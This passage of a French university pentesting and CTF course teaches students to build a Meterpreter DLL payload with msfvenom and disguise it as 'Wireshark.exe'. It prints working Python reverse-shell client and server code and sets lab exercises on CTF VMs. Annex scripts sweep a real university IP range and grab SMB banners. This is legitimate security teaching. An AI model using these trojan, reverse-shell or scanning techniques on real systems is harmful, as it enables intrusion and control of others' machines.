+<p>Meterpreter est un outil dépendant de Metasploit ayant pour but de créer des payloads assez particuliers. En effet, ces payloads, cryptés ou non, permettent de mettre en place un reverse-shell entre nous et notre cible. Nous allons donc dans un premier temps découvrir les injections DLL puis, nous ferons un comparatif entre les reverse shell "classiques" et ceux de Meterpreter.</p>
+<p>Les fichier DLL (Dynamic Link Library) sont comme des fonctions utilisées par un programme principal. Lors de son exécution, seul le programme principal est visible dans le gestionnaire des tâches ce qui rend sa détection presque impossible. De cette manière, nous allons même pouvoir appliquer un DLL à un programme existant et ayant les droits administrateur. Ainsi, le retour de ce payload à notre écran nous fournira l’accès administrateur de la cible.<br />
+Nous allons donc vous montrer la conception d’une injection DLL.<br />
+<strong>Mise en place d’une injection DLL</strong><br />
+Meterpreter va donc nous permettre la création de ces fichiers malicieux. Il faut cependant utiliser Msfvenom qui contient Meterpreter. Nous allons réaliser un reverse-shell sur un Windows server 2019 au cours de cette partie. Commençons par créer le fichier .dll:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/meterpreter/msfvenom.PNG" alt="Création du .dll" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Création du .dll<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme vous avez pu le voir, la commande est très longue mais facile à comprendre. Tout d’abord, l’argument "-p" va vous permettre de choisir le payload que vous souhaitez utiliser. N’hésitez pas à jeter à coup d’oeil à la liste de ses 556 payloads via la commande :</p>
+<p><strong>msfvenom - -list payloads</strong></p>
+<p>Cette liste vous montrera que les possibilités sont presque infinies car il existe même des attaques basées sur VNC ! Après avoir choisi son payload, il faut lui indiquer notre IP ainsi que notre port d’écoute. Pour terminer, nous indiquons la plateforme d’attaque, le format du fichier et enfin son nom. Il est à notifier que le "R" n’est en aucun cas obligatoire. Dans notre cas, nous n’avons pas choisi d’utiliser un encoder car nous avons désactivé l’anti-virus de la machine cible. N’hésitez pas encore une fois à lister les encoders afin d’en choisir un qui vous convienne. Ensuite, nous allons créer un programme qui exécutera ce fichier .dll :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/meterpreter/bat.PNG" alt="Fichier .bat" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Fichier .bat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous pouvons à pésent utiliser Winrar pour compresser ces deux fichiers sous un .exe que l’on nommera Wireshark par exemble :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/meterpreter/wireshark.PNG" alt="Wireshark.exe" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Wireshark.exe<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Revenons sur Metasploit afin de lancer l’écoute du reverse-shell lors de l’exécution de Wirshark.exe sur Windows server:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/meterpreter/msf.PNG" alt="Ecoute lors de l’exécution du fichier" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Ecoute lors de l’exécution du fichier<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous nous retrouvons bien dans Meterpreter qui va nous proposer plusieurs champs d’actions grâce à son reverse-shell. En effet, Meterpreter nous permet de manipuler les fichiers, le réseau, les périphériques ainsi que le système en lui même.<br />
+Il existe trois type de payload dans Meterpreter :</p>
+<ul>
+<li><p><strong>Single Payload :</strong> Permettent d’exécuter une tâche spécifique, ex: lancement d’une calculatrice</p></li>
+<li><p><strong>Stager Payload :</strong> Payload par étage, l’étage 0 va permettre la création du reverse shell et le stage 1 va permettre l’injection DLL vers la victime.</p></li>
+<li><p><strong>Stageless payload:</strong> Payload regroupant la totalité des outils permettant l’exploitation de la victime.</p></li>
+</ul>
+<p>Nous verrons simplement les Stager et Stageless payload puisqu’un single payload est simplement l’exécution d’un programme sur la machine cible.</p>
+<p>Les stager payload sont des payload à étages comme son nom l’indique. En effet, leur avantage est d’être moins lourd en mémoire puisqu’une fois leur exécution faite, ils vont télécharger un autre payload qui permettra de faire l’injection DLL avec les librairies utiles pour le fonctionnement de Meterpreter.<br />
+Voici un schéma du fonctionnement:</p>
+<figure>
+<img src="oui/images/Reverse_shell-meterpreter/stagepayload.png" alt="Fonctionnement d’un Stager payload. Source: secvinfo.com" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Fonctionnement d’un Stager payload. Source: <a href="secvinfo.com">secvinfo.com</a><span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Pour utiliser ce type de payload avec msfvenom il faut utiliser le paylaod <strong>windows/meterpreter/reverse_tcp</strong>. Les "slash" sont très important puisqu’ils permettent de différencier l’utilisation d’un stager d’un stageless payload.<br />
+De plus, l’avantage principale du staged payload c’est qu’il permet d’exécuter l’exploit directement dans la mémoire de la machine victime laissant ainsi très peu de traces sur le disque dur. Il y a également un chiffrage des données entre l’attaquant et la victime. Cependant, avec un stager payload, le chiffrement du trafic entre l’attaquant et la victime ne débute qu’après le téléchargement du second payload.</p>
+<p>Dans cette catégorie, le payload est envoyé entièrement sur la machine de la victime. Celui-ci contient tout ce qui est nécessaire pour obtenir un reverse shell vers la machine de l’attaquant. Aucun transfert supplémentaire à partir de la machine de l’attaquant n’est nécessaire.<br />
+Voici un bref schéma de fonctionnement de ce payload:</p>
+<figure>
+<img src="oui/images/Reverse_shell-meterpreter/Untitled Diagram(4).png" alt="Fonctionnement d’un Stageless payload" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Fonctionnement d’un Stageless payload<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Avec cette catégorie de payload, le code malveillant est envoyé entièrement sur la machine de la victime. Le chiffrement du trafic entre la victime et l’attaquant est lancé dès la première connexion. Les stageless payloads peuvent être utiles notamment dans des situations où la cible se trouve derrière un proxy qui bloque le téléchargement de fichiers exécutables.<br />
+Nous allons à présent comparer les payloads exploités par Meterpreter et les reverse-shell que nous vous avons présentés plus haut.</p>
+<p>Comme vous l’aurez compris, les fichiers écris par Msfvenom puis exploités par Meterpreter sont bien des reverse-shell. Nous allons donc observer la différence de code entre un fichier Msfvenom et ceux vu dans la section précédente.<br />
+Voici un tableau comparatif des deux scripts:</p>
+<figure>
+<img src="oui/images/Reverse_shell-meterpreter/payload.PNG" alt="Tableau comparatif" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Tableau comparatif<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<h2 id="exercices-de-programmation">Exercices de programmation</h2>
+<p>Au cours de cette partie, nous allons vous proposer de recoder des outils détaillés durant le cours afin que vous puissiez comprendre le fonctionnement global de ces derniers. Sachant que vous n’aurez pas le temps de recoder une application entière, nous vous proposons de ne recoder qu’une partie de l’outil en vous basant sur ce que nous avons déjà réalisé. Tout code suffisant pour être noté sera ajouté en bonus à votre note de TP. Si votre note de TP est déjà de 20, ce bonus sera basculé sur le DS.</p>
+<p>Comme vous l’aurez compris durant le cours, Nmap est un outil très complet. C’est pour cette raison que nous vous proposons l’exercice suivant :<br />
+Réaliser une usurpation d’adresse (spoof) tout en recueillant les ports ouverts d’une machine et les versions des services. En vu du peu de temps que vous avez, nous vous proposons un code que nous avons réalisé qui permet de connaître les ports ouverts et la version du service smb. Ce code n’est certes pas parfait mais vous permettra de gagner du temps dans vos recherches voir <strong>annexe : <a href="#fig:prog1" data-reference-type="ref" data-reference="fig:prog1">[fig:prog1]</a></strong><br />
+Pour vous aider, ce code est disponible sur Github via ce lien :<br />
+<a href="https://github.com/MatthieuGouyen/scan_port">https://github.com/MatthieuGouyen/scan_port</a></p>
+<p>Le second exercice que nous vous proposons est de compléter, améliorer et automatiser nos programmes client et server qui permettent un reverse-shell. Voici notre code :</p>
+<p><span>center,caption=<span>Code client</span>,label=<span>Code client</span>,nofloat=figure</span></p>
+<pre><code>#! /usr/bin/env python3
+&quot;&quot;&quot; Les envoies se font en bytes donc on encode les str en b&quot;&quot;&quot;
+import socket, subprocess, os, sys
+from time import sleep
+host = &quot;localhost&quot;
+port = 5555
+
+connection_with_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#creation du socket
+
+while connection_with_server.connect_ex((host, port)) != 0 : #connexion au serveur à l&#39;infini
+	sleep(2)
+																
+print (&quot;Established connection with the server on the port &quot;+str(port))
+
+end = &quot;&quot;
+
+while end != b&quot;end&quot;: 															#b pour bytes
+	command = connection_with_server.recv(1024)
+	if command.decode() == &quot;end&quot; :
+		connection_with_server.send(command)
+		end = command
+		
+	cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  
+																				#Popen -&gt; création d&#39;un programme fils dans un nouveau processus
+																				#subprocess.PIPE -&gt; rediretion vers le flux standard
+	if command[:2].decode() == &#39;cd&#39;:
+		command = command.decode()								
+		if os.path.exists(str(command[3:])):									#vérification du chemin
+			os.chdir(str(command[3:]))											#changement de dossier
+			out = b&quot;directory changed&quot;
+	else:
+		out = cmd.stdout.read() + cmd.stderr.read()	 
+	connection_with_server.send(out + b&quot;\nEnd of the results\n &quot;)
+print (&quot;Close of the session&quot;)
+connection_with_server.close()</code></pre>
+<p><span>center,caption=<span>Code serveur</span>,label=<span>Code serveur</span>,nofloat=figure</span></p>
+<pre><code>#! /usr/bin/env python3
+# Les envoies se font en bytes donc on encode les str en b
+import socket
+import pty
+
+hote = &#39;localhost&#39;
+port = 5555
+
+connection_main = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#création du socket
+connection_main.bind((hote, port))										#connexion du socket au serveur
+connection_main.listen(5)												#mode écoute
+print(&quot;The server listens on the port &quot;+str(port))
+
+connection_with_client, infos_connection = connection_main.accept()		#ack de connexion
+
+msg_received = &quot;&quot;
+
+
+while msg_received != b&quot;end&quot; : 											#b pour bytes
+	data = &#39;&#39;
+	while data == &#39;&#39;:
+		data = input(&quot;msg to send : &quot;)
+	connection_with_client.send(data.encode())
+	msg_received = connection_with_client.recv(1024)
+	print(msg_received.decode())
+
+print (&quot;Close of the session&quot;)
+connection_with_client.close()
+connection_main.close()</code></pre>
+<p>Ces deux scripts sont disponibles sur <a href="https://github.com/MatthieuGouyen/Reverse">https://github.com/MatthieuGouyen/Reverse</a></p>
+<h1 id="cinquième-partie">Cinquième partie</h1>
+<h2 id="tp">TP</h2>
+<p><strong>Objectif :</strong> découverte des outils de pentest via des exercices, réalisation d’un CTF.<br />
+<strong>Durée :</strong> 3H<br />
+Au cours de ce TP, vous allez découvrir certains outils présents sur la distribution Kali Linux ainsi que les bons gestes à avoir lors de la réalisation d’un CTF. Dans un premier temps, vous allez réaliser trois exercices présents sur la machine TP1_CTF puis vous allez affronter le CTF Bulldog.<br />
+Voici ce dont vous aurez besoin :</p>
+<ul>
+<li><p><strong>Le cours</strong></p></li>
+<li><p><strong>VM Kali.OVA sur le FTP de l’IUT</strong></p></li>
+<li><p><strong>VM Bulldog.OVA sur le FTP de l’IUT</strong></p></li>
+</ul>
+<p>Kali linux est une distribution qui nécessite des ressources surtout lors de gros calculs. N’hésitez pas à lui fournir 4Go de RAM et 3 cœurs de processeurs si cela est possible.</p>
+<ol>
+<li><p>Veuillez installer et allumer Kali et TP1_CTF sous Virtualbox en réseau NAT. Kali possède le login « root » et le mot de passe « root ».</p></li>
+<li><p>Vous êtes à présent dans un terminal sous Kali. Il vous faut dans un premier temps analyser votre réseau pour trouver votre cible. En effet, il est possible que vous n’ayez pas l’IP du CTF. La méthode la plus simple est de réaliser un : arp-scan - -localnet.<br />
+Indiquez le fonctionnement de ce type de requête.</p></li>
+<li><p>Nous sommes dans l’étape de recherche active d’informations.<br />
+Lancez un scan Nmap et donner les ports et les services ouverts.</p></li>
+<li><p>Réalisez un Dirb sur notre cible afin de trouver une piste d’attaque.<br />
+Donnez les dossiers présents sur la cible.</p></li>
+</ol>
+<p>Une fois que vous avez trouvé ces dossiers, veuillez lancer l’exercice 1 via l’url.</p>
+<ol>
+<li><p>Vous voilà sur une page de connexion. Trouvez un moyen de trouver le login et le mot de passe afin de vous enregistrer.<br />
+Aide : John The Ripper est l’outil idéal à utiliser si vous avez un mot de passe hashé.</p></li>
+</ol>
+<p>Une fois que vous vous êtes enregistrés, vous pouvez passer à l’exercice 2.</p>
+<ol>
+<li><p>Le formulaire est l’endroit qui contient le plus de failles. En effet, il permet à l’utilisateur de rentrer des informations et de communiquer avec le serveur Web.<br />
+Quelle est l’information qui vous permettra de vous enregistrer ?</p></li>
+<li><p>Comme vu dans le cours, mettez en place le proxy afin que Burpsuite puisse intercepter les requêtes du formulaire et ainsi vous permettre de vous enregistrer.</p></li>
+<li><p>Voici un nouveau formulaire avec une autre faille à exploiter. En autonomie, trouvez un moyen d’obtenir le flag de cet exercice.<br />
+Donner le nom de la faille ainsi que l’outil utilisé.</p></li>
+</ol>
+<p>Vous pouvez à présent passer à l’exercice suivant.</p>
+<ol>
+<li><p>Avec l’aide donnée par la page de l’exercice 3 ainsi que du cours, réalisez un reverse-shell sur la cible afin de trouver le flag.</p></li>
+<li><p>Connectez vous en SSH avec les informations obtenues dans le flag.<br />
+Donnez la commande pour se connecter en SSH.</p></li>
+<li><p>Trouvez le flag dans /home/&lt;USER&gt;.</p></li>
+</ol>
+<p>Dans cet exercice, vous allez réaliser le CTF Bulldog. Comme pour les autres machines, mettez-là en réseau NAT et essayez en autonomie de le réaliser. SI vous avez la moindre question, n’hésitez pas à appeler un encadrant afin qu’il puisse vous aider.</p>
+<p><strong>Objectif :</strong> exploitation des outils de scans, étude de documents, reverse-shell, python.<br />
+<strong>Durée :</strong> 3H<br />
+Lors de ce TP, vous allez devoir résoudre le CTF View2aKill présent au format OVA sur le FTP de l’IUT. Vous pouvez augmenter la quantité de RAM et de CPU de votre Kali en fonction de votre machine hôte.</p>
+<ol>
+<li><p>Veuillez télécharger ce CTF et l’installer sous Virtualbox.</p></li>
+<li><p>Allumez le CTF et Kali en réseau NAT et obtenez l’IP de la cible.</p></li>
+<li><p>Commencez à faire une recherche d’informations active via Nmap et Dirb. N’hésitez pas à utiliser un scan avec le script par défaut afin d’obtenir un maximum d’informations.<br />
+Indiquez les ports et les services ouverts.</p></li>
+<li><p>A la suite de Dirb et de Nmap, observez toutes les pages trouvées afin d’obtenir un fichier et une page exploitables.<br />
+Donnez l’url et le fichier.</p></li>
+<li><p>Avec cette recherche active d’informations, vous devez avoir obtenu une page de connexion, un mail et un mot de passe associé. Si ce n’est pas le cas, n’hésitez pas à appeler l’encadrant ou à chercher plus longtemps.</p></li>
+<li><p>Une fois connecté sur le site, à l’aide votre cours et des anciens TP, essayez de trouver une faille afin de mettre en place un reverse-shell.<br />
+Aide : Burpsuite peut être d’une grande aide.</p></li>
+<li><p>Le reverse-shell est lancé et vous êtes entré dans la machine cible.<br />
+Quelle est l’utilisateur dont vous avez pris le contrôle ?<br />
+Avec les conseils vus en cours et en fonction de vos droits sur la machine, cherchez un moyen d’établir une connexion SSH avec un utilisateur ayant plus de droits.</p></li>
+<li><p>Vous avez donc plus de droits grâce à ce nouvel utilisateur et vous pouvez accéder aux dossiers d’autres utilisateurs. L’un d’eux contient un fichier .txt qui renferme d’importantes informations et consignes à suivre.<br />
+Aide : le python vous permettra de résoudre rapidement l’énigme.</p></li>
+<li><p>Si vous avez suivi les consignes et compris les concepts des CTFs, vous êtes censés avoir obtenu le flag et ainsi gagné la partie. Si ce n’est pas le cas, n’hésitez pas à contacter l’encadrant où à chercher plus longtemps.</p></li>
+</ol>
+<h2 id="dm">DM</h2>
+<p>Dans cette section, nous allons vous proposer un DM que nous avons réalisé pour vous et qui se nomme CTF Mr Robot. Vous pouvez dès à présent le télécharger sur le FTP de l’IUT au format OVA. Le DM sera prit en note bonus dans les TP. Si votre note de TP est déjà de 20, ce bonus sera basculé sur le DS. Bonne chance à vous.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Au cours de ce module consacré au CTF, nous avons eu l’occasion d’effectuer de nombreuses recherches afin de comprendre ce qu’était réellement un CTF. Nous avons pu constater qu’il existe de nombreux domaines dans lesquels peuvent se dérouler des CTFs, ce qui implique ainsi une multitude d’outils qui ont été sélectionnés pour affiner notre approche sur le sujet. En effet, tous ces outils sont plus ou moins complexes et proposent pour la plupart une grande variété d’options ou de modes d’utilisations. Avec l’aide de Kali Linux, nous avons donc pu apprendre à manier les principaux outils, que nous considérons comme les bases pour réaliser un CTF (Nmap, Nitko, Dirbuster, Metasploit, etc...). Il faut tout de même se rappeler que ce n’est pas la distribution qui permet le pentesting mais les outils qu’elle contient.</p>
+<h1 id="sixième-partie">Sixième partie</h1>
+<h2 id="glossaire">Glossaire</h2>
+<dl>
+<dt>CTF</dt>
+<dd><p>Capture The Flag, voir <a href="https://fr.wikipedia.org/wiki/Capture_du_drapeau">https://fr.wikipedia.org/wiki/Capture_du_drapeau</a></p>
+</dd>
+<dt>ARP</dt>
+<dd><p>Address Resolution Protocol, voir <a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">https://en.wikipedia.org/wiki/Address_Resolution_Protocol</a></p>
+</dd>
+<dt>DNS</dt>
+<dd><p>Domain Name System, voir <a href="https://www.frameip.com/dns/">https://www.frameip.com/dns/</a></p>
+</dd>
+<dt>MAC</dt>
+<dd><p>Media Access Control, voir <a href="https://fr.wikipedia.org/wiki/Adresse_MAC">https://fr.wikipedia.org/wiki/Adresse_MAC</a></p>
+</dd>
+<dt>TCP</dt>
+<dd><p>Transmission Control Protocol, voir <a href="https://fr.wikipedia.org/wiki/Transmission_Control_Protocol">https://fr.wikipedia.org/wiki/Transmission_Control_Protocol</a></p>
+</dd>
+<dt>UDP</dt>
+<dd><p>User Datagram Protocol, voir <a href="https://fr.wikipedia.org/wiki/User_Datagram_Protocol">https://fr.wikipedia.org/wiki/User_Datagram_Protocol</a></p>
+</dd>
+<dt>HTTP</dt>
+<dd><p>Hypertext Transfer Protocol, voir <a href="https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol">https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol</a></p>
+</dd>
+<dt>HTML</dt>
+<dd><p>Hypertext Markup Language, voir <a href="https://fr.wikipedia.org/wiki/Hypertext_Markup_Language">https://fr.wikipedia.org/wiki/Hypertext_Markup_Language</a></p>
+</dd>
+<dt>CLI</dt>
+<dd><p>Command Line Interface, voir <a href="https://fr.wikipedia.org/wiki/Interface_en_ligne_de_commande">https://fr.wikipedia.org/wiki/Interface_en_ligne_de_commande</a></p>
+</dd>
+<dt>GUI</dt>
+<dd><p>Graphical User Interface, voir <a href="https://fr.wikipedia.org/wiki/Interface_graphique">https://fr.wikipedia.org/wiki/Interface_graphique</a></p>
+</dd>
+<dt>XSS</dt>
+<dd><p>Cross-site scripting, voir <a href="https://fr.wikipedia.org/wiki/Cross-site_scripting">https://fr.wikipedia.org/wiki/Cross-site_scripting</a></p>
+</dd>
+<dt>SQL</dt>
+<dd><p>Structured Query Language, voir <a href="https://fr.wikipedia.org/wiki/Structured_Query_Language">https://fr.wikipedia.org/wiki/Structured_Query_Language</a></p>
+</dd>
+<dt>PHP</dt>
+<dd><p>Hypertext Preprocessor, voir <a href="https://www.php.net/">https://www.php.net/</a></p>
+</dd>
+<dt>OSI</dt>
+<dd><p>Open Systems Interconnection, voir <a href="https://fr.wikipedia.org/wiki/Modèle_OSI">https://fr.wikipedia.org/wiki/Modèle_OSI</a></p>
+</dd>
+<dt>LAN</dt>
+<dd><p>Local Area Network , voir <a href="https://fr.wikipedia.org/wiki/Réseau_local">https://fr.wikipedia.org/wiki/Réseau_local</a></p>
+</dd>
+<dt>IDS</dt>
+<dd><p>Intrusion Detection System, voir <a href="https://fr.wikipedia.org/wiki/Système_de_détection_d&#39;intrusion">https://fr.wikipedia.org/wiki/Système_de_détection_d'intrusion</a></p>
+</dd>
+<dt>DLL</dt>
+<dd><p>Dynamic Link Library, voir <a href="https://fr.wikipedia.org/wiki/Dynamic_Link_Library">https://fr.wikipedia.org/wiki/Dynamic_Link_Library</a></p>
+</dd>
+</dl>
+<h2 id="bibliographie">Bibliographie</h2>
+<h2 id="annexe">Annexe</h2>
+<p>*<span>Script Nslookup</span></p>
+<pre><code>    &quot;&quot;Script permettant de faire une résolution DNS sur la plage ip 193.51.33.0/24&quot;&quot;
+    import socket
+    import subprocess
+    i = 0
+    str2 = &quot;193.51.33.&quot;,i     #Ip du domaine uvsq.fr
+    for i in range (1,255):
+        ip = &quot;193.51.33.{0}&quot;.format(i)
+        print(socket.gethostbyaddr(ip))     #Utilisation de socket pour pouvoir effectuer la  requête DNS</code></pre>
+<p><span id="fig:nslookup" label="fig:nslookup">[fig:nslookup]</span></p>
+<p>*<span>Script Nmap</span></p>
+<pre><code>#! /usr/bin/env python3
+import os
+import socket
+import subprocess
+import time
+from tqdm import tqdm #barre d&#39;avancement
+import re		#Matche la regex
+#import chardet #Ne fonctionne malheuresement pas correctement
+
+def match (string,reg):
+	&quot;&quot;&quot;Va renvoyer la valeur du match de la regex : None = mauvaise regex ou encodage&quot;&quot;&quot;
+	test=re.match(reg, string)
+	return test
+
+def requestversion(request, port):
+	&quot;&quot;&quot;Va envoyer la requête au port voulu et retourner le port, le nom et la version&quot;&quot;&quot;
+	name=services(port)
+	if name ==&#39;microsoft-ds&#39; and port == 445: 	#nmap simple trouve microsoft tandis que nmap -sV trouve netbios-ssn, sûrement une erreur dans le dictionnaire...
+		name=services(139)
+	connection.send(request)
+	version=connection.recv(2000)			#Problème ici de codec. Oui tout le monde n&#39;utilise pas l&#39;unicode
+	#code=chardet.detect(version) 			#Ne fonctionne pas ! Renvoi un codec non fonctionnel et qui varie 
+	#print(code)
+	l=[&#39;ascii&#39;,&#39;big5&#39;,&#39;big5hkscs&#39;,&#39;cp037&#39;,&#39;cp273&#39;,&#39;cp424&#39;,&#39;cp437&#39;,&#39;cp500&#39;,&#39;cp720&#39;,&#39;cp737&#39;,&#39;cp775&#39;,&#39;cp850&#39;,&#39;cp852&#39;,&#39;cp855&#39;,&#39;cp856&#39;,&#39;cp857&#39;,&#39;cp858&#39;,
+	&#39;cp860&#39;,&#39;cp861&#39;,&#39;cp862&#39;,&#39;cp863&#39;,&#39;cp864&#39;,&#39;cp865&#39;,&#39;cp866&#39;,&#39;cp869&#39;,&#39;cp874&#39;,&#39;cp875&#39;,&#39;cp932&#39;,&#39;cp949&#39;,&#39;cp950&#39;,&#39;cp1006&#39;,&#39;cp1026&#39;,&#39;cp1125&#39;,&#39;cp1140&#39;,
+	&#39;cp1250&#39;,&#39;cp1251&#39;,&#39;cp1252&#39;,&#39;cp1253&#39;,&#39;cp1254&#39;,&#39;cp1255&#39;,&#39;cp1256&#39;,&#39;cp1257&#39;,&#39;cp1258&#39;,&#39;cp65001&#39;,&#39;euc_jp&#39;,&#39;euc_jis_2004&#39;,&#39;euc_jisx0213&#39;, &#39;euc_kr&#39;,
+	 &#39;gb2312&#39;,&#39;gbk&#39;,&#39;gb18030&#39;,&#39;hz&#39;,&#39;iso2022_jp&#39;,&#39;iso2022_jp_1&#39;,&#39;iso2022_jp_2&#39;,&#39;iso2022_jp_2004&#39;,&#39;iso2022_jp_3&#39;,&#39;iso2022_jp_ext&#39;,&#39;iso2022_kr&#39;,
+	 &#39;latin_1&#39;,&#39;iso8859_2&#39;,&#39;iso8859_3&#39;,&#39;iso8859_4&#39;,&#39;iso8859_5&#39;,&#39;iso8859_6&#39;,&#39;iso8859_7&#39;,&#39;iso8859_8&#39;,&#39;iso8859_9&#39;,&#39;iso8859_10&#39;,&#39;iso8859_11&#39;,
+	 &#39;iso8859_13&#39;,&#39;iso8859_14&#39;,&#39;iso8859_15&#39;,&#39;iso8859_16&#39;,&#39;johab&#39;,&#39;koi8_r&#39;,&#39;koi8_t&#39;,&#39;koi8_u&#39;,&#39;kz1048&#39;,&#39;mac_cyrillic&#39;,&#39;mac_greek&#39;,&#39;mac_iceland&#39;,
+	 &#39;mac_latin2&#39;,&#39;mac_roman&#39;,&#39;mac_turkish&#39;,&#39;ptcp154&#39;,&#39;shift_jis&#39;,&#39;shift_jis_2004&#39;,&#39;shift_jisx0213&#39;,&#39;utf_32&#39;,&#39;utf_32_be&#39;,&#39;utf_32_le&#39;,
+	 &#39;utf_16&#39;,&#39;utf_16_be&#39;,&#39;utf_16_le&#39;,&#39;utf_7&#39;,&#39;utf_8&#39;,&#39;utf_8_sig&#39;,&#39;iso8859-15&#39;]
+#Cette liste de codecs va donc être utilisée pour matcher la regex
+	with open(&quot;nmap-service-probes&quot;,&quot;r&quot;) as g:	#Ouverture de nmap-service-probes pour matcher et récuperer le proto et la version	
+		ligne=g.readlines()
+	b=0	
+	while b &lt;len(ligne):				#Pour chaque ligne du fichier
+		espace=ligne[b].split()			#On découpe en espace
+		if len(espace) &gt; 1:				#Si la phrase contient plusieurs espaces, on enlève ainsi toutes les phrases sans valeurs
+			if espace[0] == &#39;match&#39; and espace[1] == name:	#Si la phrase commence par match et par notre service
+				trio=ligne[b].split(&quot; &quot;,2)	#On sépare cette phrase en trois : match, le service et le reste
+				reg=trio[2].split(&quot; p/&quot;)	#On isole la regex du reste
+				regp=reg[0].replace(&quot;m|&quot;,&quot;&quot;).replace(&quot;m=&quot;,&quot;&quot;).replace(&quot;|s&quot;,&quot;&quot;).replace(&quot;=s&quot;,&quot;&quot;)	#On rend &quot;pur&quot; la regex&quot;
+				n=0
+				while n &lt; len(l) :	#Le but ici est de tester tous les encodages et regex pour matcher
+					try:
+						try :
+							v2=version.decode()
+						except (LookupError,UnicodeDecodeError):
+							v2=version.decode(l[n],&#39;ignore&#39;)
+						if match(v2,regp) :	#Si ça match, après test, il y en a plusieurs au sein de service-probes
+							sproto=reg[1].split(&#39;/ v/&#39;)#On va donc essayer d&#39;en éliminer pour récupérer que celui avec v/ soit la version
+							if len(sproto) &gt;1:	#L&#39;élimination se fait ici
+								prot=sproto[0]	#Le protocole est la première partie de ce split
+								sversion=sproto[1].split(&#39;/ i/&#39;)
+								if len(sversion) &gt; 1:
+									ver=sversion[0]	#La version se récupère de la même manière que le protocole
+									version=prot+ver
+									n=len(l)
+									b=len(ligne)
+								else:
+									n=len(l)
+							else :
+								n=len(l)
+						else:
+							n+=1
+					except LookupError :		#LookupError est obtenue lorsque l&#39;on ne peut pas décoder la version
+						n+=1
+		b+=1
+	connection.close()
+	return port, name , version
+
+
+
+def services(port) :							
+	&quot;&quot;&quot;Retourne le service du port fourni&quot;&quot;&quot;
+	with open(&quot;nmap-services&quot;,&quot;r&quot;) as f:		#Ouverture du fichier nmap-services où sont sotckés les noms des services
+		list1 = f.readlines()
+	for l in list1:
+		test=(l.split()[1])						#nmap-services contient les ports en tcp et udp et on veut du tcp
+		test2=test.split(&#39;/&#39;)
+		if test2[1] != &quot;udp&quot; and test2[0] == str(port): #On récupère le nom en fonction du port
+			return l.split()[0]
+
+if __name__==&quot;__main__&quot;:	
+	os.system(&#39;clear&#39;)
+	ip_dest=input(&quot;Entre ip victime : &quot;)
+	port=1
+	time1=time.time()
+	list_port=list()
+	port_name=list()
+	banner=list()
+	for i in tqdm(range(1000)):					#On scanne ici les 1000 premiers ports
+		connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #On ouvre le socket
+		essai=connection.connect_ex((ip_dest, port))	#On essaie de se connecter, renvoi 0 si c&#39;est une réussite
+		if essai== 0:
+			port, name, version = requestversion(b&#39;\0\0\0\xa4\xff\x53\x4d\x42\x72\0\0\0\0\x08\x01\x40\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x40\x06\0\0\x01\0\0\x81\0\x02PC NETWORK PROGRAM 1.0\0\x02MICROSOFT NETWORKS 1.03\0\x02MICROSOFT NETWORKS 3.0\0\x02LANMAN1.0\0\x02LM1.2X002\0\x02Samba\0\x02NT LANMAN 1.0\0\x02NT LM 0.12\0&#39;,port)								#Requête pour les ports 139 et 445 trouvé dans nmap-service-probes
+
+
+			port_name.append(port)			#Pour chaque port ouvert, on enregistre son nom, son port et sa version
+			list_port.append(name)
+			banner.append(version)
+		port+=1
+	for i in range (len(list_port)):		#On affiche le tout à la fin du scan
+		print(list_port[i],port_name[i],banner[i])
+	time2=time.time()-time1
+	connection.close()
+	print(&quot;Time of the scan :&quot;,time2)</code></pre>
+<p><span id="fig:prog1" label="fig:prog1">[fig:prog1]</span></p>
+<section class="footnotes">
+<hr />
+<ol>
+<li id="fn1"><p>CTF peut-être traduit en capture du drapeau.<a href="#fnref1" class="footnote-back">↩</a></p></li>
+</ol>
+</section>
+</body>
 </html>
